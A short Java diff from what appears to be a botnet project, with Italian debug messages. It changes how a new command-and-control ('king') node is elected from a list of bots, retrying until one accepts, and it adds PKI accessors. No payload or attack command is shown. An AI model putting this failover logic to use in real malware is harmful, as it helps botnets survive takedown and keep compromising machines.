@@ -270,7 +270,9 @@ public class Commando {
 			}
 		}
 
+
 		System.out.println(ccList.remove(nServ.getMyIp().toString()));
+		while(pServ.getNewKing().equals("")){
 		if (ccList.size() > 0) {
 			Long l = System.currentTimeMillis();
 			String s = l.toString() + botList.size();
@@ -292,12 +294,15 @@ public class Commando {
 			System.out.println("ho eletto " + ip);
 			if (ccReq.becameCc(ip)) {
 				pServ.setNewKing(bServ.searchBotIP(ip).getIdBot());
+			}else{
+				ccList.remove(ip);
 			}
 			System.out.println("erection completed strating transfer ");
 		} else
 			System.out.println("nessuno da eleggere");
 		// elegilo passa i dati
 		// passa il potere
+	}
 	}
 
 	public byte[] syncNeightboursBot(List<String> data) {
@@ -380,6 +385,14 @@ public class Commando {
 
 	public void setCrypto(CryptoUtils crypto) {
 		this.crypto = crypto;
+	}
+
+	public CryptoPKI getPki() {
+		return pki;
+	}
+
+	public void setPki(CryptoPKI pki) {
+		this.pki = pki;
 	}
 	
 
